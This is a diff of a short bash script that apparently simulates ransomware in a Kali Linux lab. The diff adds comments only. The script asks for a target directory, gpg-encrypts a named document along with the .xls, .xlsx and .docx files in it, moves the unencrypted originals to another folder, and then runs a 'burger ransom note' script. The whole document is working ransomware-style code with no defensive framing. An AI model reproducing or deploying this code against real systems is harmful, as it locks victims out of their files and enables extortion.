@@ -1,15 +1,16 @@
 #!/bin/bash
-
+# Choose directory to encrypt as $target
 read -p "Enter target directory: " target
-
+#encrypt a specific file with filename
 gpg -r kali1 --encrypt-files $(ls $target/Important-Document)
-
+#encrypt all .xls files, with 'exception'
 gpg -r kali1 --encrypt-file $(ls $target/*.xls | egrep -v 'loader') 
-
+#encrypt all .xlsx files
 gpg -r kali1 --encrypt-file $(ls $target/*.xlsx) 
-
+#encrypt all .docx files
 gpg -r kali1 --encrypt-file $(ls $target/*.docx) 
 
+#move unencrypted files to desired location
 targetfiles=$target/Important-Document
 mv $targetfiles '/home/kali/Desktop/Unencrypted Files'
 
@@ -22,5 +23,6 @@ mv $targetfiles '/home/kali/Desktop/Unencrypted Files'
 targetfiles=$target/*.docx
 mv $targetfiles '/home/kali/Desktop/Unencrypted Files'
 
+#show burger ransom note
 NOTE="/home/kali/Desktop/Opening_Page"
 sh "$NOTE"
